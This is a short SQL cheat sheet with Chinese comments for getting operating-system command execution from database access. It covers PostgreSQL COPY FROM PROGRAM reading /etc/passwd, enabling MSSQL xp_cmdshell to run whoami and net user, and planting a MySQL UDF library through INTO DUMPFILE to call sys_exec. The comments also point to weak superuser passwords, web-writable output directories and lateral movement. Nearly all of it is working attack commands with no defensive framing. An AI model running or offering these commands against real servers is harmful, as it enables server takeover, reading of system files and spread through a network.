-- 超级用户会话（如 postgres 弱口令）
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(line TEXT);
COPY cmd_output FROM PROGRAM 'id; cat /etc/passwd | head -5';
SELECT * FROM cmd_output;

-- 大文件场景可将输出落盘到 Web 可写目录配合读文件获取。

-- 需要 sysadmin 角色
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';

-- 服务账户通常为 NT SERVICE\MSSQLSERVER 或域账户，可进一步横向。

-- 1) 查询插件目录与是否允许落盘
SHOW VARIABLES LIKE 'plugin_dir';
SHOW VARIABLES LIKE 'secure_file_priv';

-- 2) 写入动态库（lib_mysqludf_sys.so，内容可经 hex 编码 SELECT ... INTO DUMPFILE 还原）
SELECT UNHEX('7F454C46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udfsys.so';

-- 3) 注册并调用
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udfsys.so';
SELECT sys_exec('whoami > /tmp/out');
SELECT sys_eval('id');
